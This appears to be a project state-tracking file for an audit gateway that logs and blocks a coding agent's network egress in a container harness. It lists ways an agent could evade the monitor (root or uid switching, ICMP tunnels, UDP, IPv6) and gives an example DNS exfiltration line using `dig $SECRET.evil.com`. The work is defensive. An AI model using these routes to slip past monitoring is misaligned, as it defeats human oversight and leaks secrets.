# AI-DLC State Tracking

## Project Information
- **Project Type**: Brownfield
- **Feature**: M7 — `--audit` network audit log (+ G6 egress allow-list)
- **Start Date**: 2026-08-11T13:36:55Z
- **Last Updated**: 2026-11-01
- **Branch**: `feature/audit-inception`
- **Current Stage**: CONSTRUCTION — completion plan, **Batch 1 done and
  live-verified (2026-11-01); Batch 2 next**

## ▶ RESUME POINT (next session) — start Batch 2

**State:** Batch 1 is committed (`8a328c3`, `cbcf4a6`, `156104e`, `cc2135b`) and
passed the host smoke test 18/18. The plan and decisions are approved (UDP/QUIC
blocking accepted 2026-10-05), so Batch 2 needs no new approval gate. Keep this
file and `audit.md` current, as before.

**Batch 2 brief (details under COMPLETION PLAN below):**
- **Where the code goes:** mostly `compose/audit/entrypoint.sh`, which today
  RETURNs uid 0 and REDIRECTs only tcp/80 and tcp/443 (nat OUTPUT), and runs
  `sysctl -w net.ipv4.conf.all.route_localnet=1 … || true`, which likely fails
  silently. Also the audit fragment in `trigon-up.sh` (the `--audit` block;
  add `sysctls:` to `audit-gw` — the agent shares its netns). The "blocked"
  record goes in `compose/audit/audit_addon.py` (schema v2 chain; add the
  record type to design §5.1). Wording changes go in `--help`, README and
  design §3/§8.
- **Steps:** (1) redirect all agent TCP, keeping lo and uid 0 exempt; (2) a
  filter OUTPUT REJECT for the agent uid on everything that isn't lo,
  redirected TCP or DNS (DNS stays allowed until Batch 3), using REJECT so
  clients fall back fast; (3) IPv6 off via compose `sysctls` plus an
  `ip6tables` default-deny; (4) move `route_localnet` into compose `sysctls`;
  (5) dump the REJECT counters into the log as a "blocked" record at shutdown;
  (6) make the "ALL egress" wording precise.
- **Rebuild?** No. `entrypoint.sh` and `audit_addon.py` are bind-mounted
  read-only into the gateway, so edits take effect on the next launch. Only
  `compose/audit/Dockerfile` changes need `./build.sh --audit-gateway`; that
  includes adding `ip6tables` if the image lacks it (check iptables-nft).
- **Verification:** bats `--dry-run` cases for the fragment (sysctls). No
  Docker in the dev container, so write `tests/smoke/audit-batch2.sh` modelled
  on `audit-batch1.sh`: one command, why plus PASS/FAIL per step, own settings
  dir, `--no-sudo`. Its checks should cover: tcp to a non-80/443 port is logged
  (e.g. `curl` to a :8443 or :22 host), UDP/QUIC and ICMP are refused fast
  (`ping`, `nc -u`, `curl --http3` if available), no IPv6 route, Claude Code
  still works, the "blocked" record is present, and the chain still verifies.
  First test the stubbed paths here against a fake `docker` (the pattern from
  last session).
- **Ask the user before:** changing `--air-gap` behaviour without `--audit`
  (only relevant in Batch 3, if the air-gap DNS check finds a leak).
- **Known environment facts:** the host repo is `~/projects/Trigon`; the
  user's working session is named `trigon-dev` and was launched before
  Batch 1 (project `compose`). The smoke login lives in
  `~/.trigon-settings-smoke`. Inside the container, bats has to be cloned
  into the scratchpad, and shellcheck comes from the `shellcheck-py` pip wheel
  (download + unzip). One loose end: a root-owned session dir appeared in
  `/tmp/trigon-smoke` on 2026-11-01, origin unknown (not via `--audit`; the
  guard refused under real sudo). It's deleted; `journalctl _COMM=sudo` would
  tell.

### Earlier resume notes (history)
Requirements + Workflow Planning + Application Design **all approved**.
CONSTRUCTION is implemented and host-verified (bash -n, dry-run behavior, 26 unit
tests incl. PBT all green). **The `--audit` feature is code-complete.**

**Live-testing (2026-08-15, user has Docker) — 3 iterations:**
- **Fix #1 (image, exit 127):** stock `mitmproxy/mitmproxy` lacks `iptables`.
  Added `compose/audit/Dockerfile` (mitmproxy + iptables + procps),
  `./build.sh --audit-gateway` → `trigon-audit-gw:latest`, default
  `TRIGON_AUDIT_IMAGE` now that tag, launch-time fail-closed preflight.
- **Fix #2 (perms, exit 1):** `PermissionError` on `/audit-log/.mitmproxy/*`.
  `cap_drop: ALL` strips DAC_OVERRIDE, so uid-0 can't write the host-owned
  (uid-1000 `mktemp`) mount. Added `DAC_OVERRIDE` to the sidecar `cap_add`
  (now `[NET_ADMIN, DAC_OVERRIDE]`).
- **Now:** gateway reaches **Healthy**, agent runs, session completes, log +
  summary land in the project's `audit-log/`. **BUT two open issues (below).**

**✔ Issue 1 (empty log) — FIXED and live-verified 2026-09-30 (committed):**
- Root cause was the addon, not iptables: `ignore_connection=True` in
  `tls_clienthello` makes mitmproxy build `TCPLayer(ignore=True)`, which has no
  flow, so `tcp_end` never fired. The `nf_tables` REDIRECT worked all along
  (packet counters rose; agent shares the gateway netns as uid 1000).
- Fix (`compose/audit/audit_addon.py`): destination-only mode now sets
  `ignore_hosts=.*` + `show_ignored_hosts=true` (still no decryption, but tcp_*
  hooks fire); SNI is parsed from the plaintext ClientHello, bytes counted per
  direction without retaining payload. Failed/hanging connects are tracked via
  `server_connect*` hooks and logged with an `error` field (schema addition,
  `docs/audit-design.md` §5.1). `done()` flushes open connections + pending
  attempts.
- Fix (`trigon-up.sh` finalize): `compose rm --stop --force -v audit-gw` before
  copying the log, so the flush happens and the sidecar no longer outlives the
  session.
- Live result: real destinations with byte counts, `192.0.2.1` logged as
  `"unresolved at shutdown"`, no healthcheck noise, no leftover gateway.
- Caveats: records are written at connection close; plain-HTTP (:80) records
  carry a bare IP as `dst_host`; mitmproxy hot-reloads the addon if the file is
  edited mid-session (flushes + loses in-flight SNI).

**▶ COMPLETION PLAN (agreed 2026-10-05). Batch 1 done and live-verified
2026-11-01 (host smoke run 18/18 PASS); next: Batch 2.**
Goal: make "ALL agent egress is logged or blocked" literally true, fix the log
location (issue 2) and support concurrent sessions. Batches in order:

**Batch 1 — one quick session, low risk (no Docker needed except a final smoke run):**
- **Progress (2026-10-31):** 1a ✔, 1b ✔, 1c ✔ — committed, host-verified
  (56/56 bats incl. stub-`docker` finalize/teardown cases, 38 python tests incl.
  chain PBT, shellcheck clean apart from the pre-existing SC2004 at the
  `PROJECT_PATHS[$i]` line). **Not live-verified** (no Docker in dev). Extras
  found and fixed on the way: a non-zero session exit skipped finalize and
  `cleanup` deleted the unexported log (1b); INT/TERM resumed the script after
  cleanup (1b). Note: two concurrent sessions still need distinct `--name`s
  (fixed container name), which docker rejects loudly rather than colliding.
- **Batch 1 host smoke run — ✔ 18/18 PASS on the user's Docker host, 2026-11-01**
  (two concurrent gateways, clean teardown, 25-record log verified, edit + truncation
  detected, uid-0 guard refused under real sudo). Checks: (1) `--audit --root` and
  `sudo … --audit` refuse with exit 1; (2) two concurrent `--audit --prompt-file`
  sessions with different `--name`s → two `trigon-<name>-<hex>` projects in
  `docker compose ls`, two distinct `…-audit-gw-1` containers, none left after
  exit; (3) logs in `~/.local/state/trigon/audit/<project>-<cksum>/`, dir 0700,
  files 0444, no `audit-log/` in the project, and `lib/audit_summary.py --verify
  LOG <printed head>` → verified; an edited copy → BROKEN. **Automated as
  `tests/smoke/audit-batch1.sh`** (host-only; PASS/FAIL per step; safe next to a
  running Trigon session; first run asks for a one-time login into
  `~/.trigon-settings-smoke`).
- **1a. `--audit` + `--root` guard (NEW HOLE, found 2026-10-05).** `entrypoint.sh`
  RETURNs uid 0 so mitmproxy's own upstream isn't looped back; with `--root` the
  agent *is* uid 0 (`LOCAL_UID=0`), so none of its egress is redirected/logged.
  Same if the host user is root (e.g. CI). Running mitmdump under a dedicated uid
  is not enough: `--root` grants `SETUID`, so the agent could switch to it. Fix:
  refuse `--audit` + `--root` (like `--playwright`), and refuse when `id -u` is 0.
  Add bats cases.
- **1b. Per-session compose project.** `trigon-up.sh` never passes `-p`, so every
  invocation (audit or not, incl. the litellm sidecar / air-gap net) shares the
  compose project "compose" → `compose-audit-gw-1` collides. Fix: per-invocation
  `-p trigon-${NAME}-<short random>` (lowercased/sanitized) on every compose call,
  plus `compose down` at exit so per-session networks don't accumulate. Finalize's
  `rm --stop audit-gw` then targets only this session's gateway.
- **1c. Issue 2 — log location + tamper evidence (decision D7, approved 2026-10-05).**
  - Destination: `${XDG_STATE_HOME:-$HOME/.local/state}/trigon/audit/<project-slug>/`,
    overridable via `TRIGON_AUDIT_DIR`. No longer written into `<project>/audit-log/`
    (update requirements wording, README, `--help`, `.gitignore` note, design §5).
  - Add that dir to `mount_denied_reason()` (G1 deny-list) so it can never be
    mounted into a container. Dir 0700, finished files chmod 0444.
  - Hash chain: each JSONL record carries `prev` = sha256 of the previous line
    (genesis = fixed value); schema bump to v2. `audit_summary.py` verifies the
    chain, records the head hash in the summary, and `trigon-up.sh` prints the
    head hash at session end. Result: the agent never reaches the log
    (tamper-proof from the agent), later edits by anyone are detectable.
  - Update `tests/test_audit_summary.py` (chain verify + PBT: any single-line
    edit/delete/reorder is detected) and `audit.bats`.

**Batch 2 — coverage (needs live checks on the user's Docker):**
- Redirect **all** agent TCP (not just 80/443) to mitmproxy; keep loopback and the
  gateway uid excluded. Destination-only mode passes everything through
  immediately (`ignore_hosts=.*`), so server-speaks-first protocols (SSH, SMTP,
  DBs) should work. Decrypt mode: limit interception to :80/:443 via an
  `ignore_hosts` regex on `host:port` — verify live.
- **Block everything else by default** (filter OUTPUT for the agent uid): allow lo,
  TCP (redirected), DNS (→ Batch 3); **REJECT** (not DROP, so clients fall back
  fast) all other UDP incl. QUIC, ICMP (Docker's default `ping_group_range` lets
  an unprivileged uid ping without NET_RAW → ICMP tunnels), everything else. At
  shutdown dump the REJECT counters into the log as a "blocked" record.
  UDP/QUIC blocking accepted 2026-10-05 (see rationale below).
- **IPv6 off:** compose `sysctls: net.ipv6.conf.all.disable_ipv6=1` + `ip6tables`
  default-deny as belt-and-braces.
- Move `route_localnet` to compose `sysctls:` — the entrypoint's `sysctl -w ... || true`
  likely fails silently (`/proc/sys` is read-only in an unprivileged container).
- Update `--help`/README "ALL egress" wording to the precise guarantee.

**Batch 3 — DNS logging (the hard one; biggest remaining hole):**
- The agent resolves via Docker's embedded resolver 127.0.0.11; Docker's own nat
  OUTPUT DNAT runs before our appended rules and dockerd does the upstream lookup,
  so DNS never touches mitmproxy → `dig $SECRET.evil.com` exfiltrates unlogged.
- Fix: second mitmproxy listener in DNS mode (mitmproxy 11 supports `dns` mode);
  `-I` (insert, ahead of Docker's rules) a redirect of the agent uid's udp+tcp :53
  to it; addon logs query names via `dns_request`. Expect a few live iterations.
- Also verify whether `--air-gap` leaks DNS the same way (embedded resolver
  forwarding on `internal: true` networks).

**Batch 4 — before merge:**
- Live gates: `--audit-decrypt` doesn't break Claude Code's provider calls (Node
  CA trust); `--air-gap --audit` zero-egress; `--playwright-headless` egress
  transits the gateway.
- Pin `MITMPROXY_BASE` by digest in `compose/audit/Dockerfile` (NFR-6).
- Run `tests/cli/audit.bats` under bats + shellcheck; open PR to `master`.

**Rationale — blocking UDP/QUIC (asked 2026-10-05):** Claude Code is Node.js;
Node's `https`/`fetch` (undici) speak HTTP/1.1 (+HTTP/2 over TCP), not HTTP/3, so
it never uses QUIC. OpenCode (Bun) likewise. npm/pip/apt/git/curl are TCP.
DNS is the only UDP an agent needs, and it is handled separately (Batch 3).
Chromium (`--playwright-headless`) does try QUIC, but falls back to TCP
automatically when UDP is refused (as on many corporate networks) — REJECT makes
the fallback instant. What does break, by design: UDP tools (VPNs/WireGuard, NTP
clients, mosh, `nmap -sU` in security mode). Note that in the security-mode docs.
Container clock comes from the host, so NTP is irrelevant.

**Files delivered:** `trigon-up.sh` (flags/guards/fragment/finalize/help),
`compose/audit/{entrypoint.sh,audit_addon.py}`, `lib/audit_summary.py`,
`tests/cli/audit.bats`, `tests/test_audit_summary.py`, README + `.gitignore`,
`docs/audit-design.md`.

**Locked design decisions (D1–D6):**
- D1 = **transparent gateway** (agent on internal net; mitmproxy sidecar
  dual-homed, NET_ADMIN scoped to sidecar, iptables REDIRECT). B (internal-net +
  proxy) documented as fallback. Completeness ⟂ decryption (A logs all
  destinations incl. hostile; decrypt reveals only honest CA-accepting flows).
- D2 = **pass-through-SNI** on decrypt refusal (default); `--audit-decrypt-fail-closed` strict.
- D3 = **sidecar-only bind mount** for `audit-log/` (tamper-resistant, NFR-4).
- D4 = **mitmproxy pinned-by-digest** for both paths.
- D5 = **allow** `--audit` + `--playwright-headless`; refuse `--audit` + `--playwright`.
- D6 = flags `--audit`, `--audit-decrypt`, `--audit-allow-degraded`, `--audit-decrypt-fail-closed`.

**Key Construction crux:** how to pin the agent's default route to `audit-gw` in
Compose *without* granting the agent NET_ADMIN (decides whether D1-B fallback is
needed) — see `docs/audit-design.md` §10.

**Locked decisions to carry forward** (see `requirements.md`):
- Enforced gateway (unbypassable, reuses `--air-gap` internal-net topology).
- Destination-only logging by default; `--audit-decrypt` opt-in for full detail.
- Completeness is a hard guarantee; decryption is cooperative/soft (NFR-10) — do
  not market `--audit-decrypt` as unbypassable.
- Refuse `--audit` + `--playwright`; JSONL + summary in `audit-log/`; opt-in
  (default off); allow-list enforcement (G6) is out of scope this cycle.
- **Ceremony**: Full (aidlc-state.md + audit.md logging + approval gates)
- **Artifacts Root**: `docs/audit/` (repo convention; not the default `aidlc-docs/`)

## Workspace State
- **Existing Code**: Yes
- **Programming Languages**: Bash (`trigon-up.sh`, `build.sh`, wrappers), Python 3 (`lib/*.py`)
- **Build System**: `build.sh` + Docker multi-stage; Docker Compose fragments
- **Project Structure**: Single-repo CLI harness (no services/APIs/data stores)
- **Reverse Engineering Needed**: Yes — scoped to the networking/egress subsystem
- **Workspace Root**: `/app`

## Code Location Rules
- **Application Code**: Workspace root (`trigon-up.sh`, `compose/`, `lib/`)
- **Documentation / AI-DLC artifacts**: `docs/audit/` only
- **Design doc deliverable**: `docs/audit-design.md` (Application Design stage)

## Stage Progress
- [x] Workspace Detection — 2026-08-11T13:36:55Z
- [x] Reverse Engineering (scoped) — approved 2026-08-11
- [x] Requirements Analysis — `requirements.md` written (rev: enforced gateway +
  destination-only default + NFR-10 + verified VibePod prior art), **approved 2026-08-13**
- [x] User Stories — **SKIPPED** (single operator/DPO persona)
- [x] Workflow Planning — `inception/plans/execution-plan.md` written, **approved 2026-08-13**
- [x] Application Design — `docs/audit-design.md` + `inception/plans/application-design-plan.md`
  (D1–D6 answered), **approved 2026-08-15**
- [x] Units Generation — **SKIPPED** (single component)
- [x] Construction — Code Generation + Build & Test **complete, host-verified**
  (live-container verification parked); Functional/NFR/Infra Design folded into
  Application Design

## Extension Configuration
| Extension | Enabled | Mode | Decided At |
|---|---|---|---|
| Security Baseline | Yes | Blocking (all rules) | Requirements Analysis |
| Resiliency Baseline | No | — | Requirements Analysis |
| Property-Based Testing | Yes | Partial (PBT-02/03/07/08/09 blocking; rest advisory) | Requirements Analysis |

## Scope Note
- Q7=B expanded this cycle from "design doc" to **full implementation** of
  `--audit` (Inception → Construction). Flagged for confirmation at the
  Requirements approval gate.
